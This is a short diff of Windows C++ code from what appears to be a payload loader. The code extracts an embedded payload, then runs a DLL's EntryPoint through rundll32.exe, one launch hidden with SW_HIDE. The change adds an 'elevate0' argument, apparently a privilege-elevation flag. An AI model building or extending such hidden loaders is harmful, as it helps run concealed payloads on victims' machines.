@@ -76,7 +76,7 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
 
     extractPayload(hInstance);
 
-    LPWSTR command = lstrcat_heap(dll_path, L",EntryPoint");
+    LPWSTR command = lstrcat_heap(dll_path, L",EntryPoint elevate0");
     wprintf(command);
     ShellExecute(NULL, L"open", L"C:\\Windows\\System32\\rundll32.exe", command, NULL, SW_SHOWNORMAL);
     ShellExecute(NULL, L"open", L"C:\\Windows\\System32\\rundll32.exe", command, NULL, SW_HIDE);
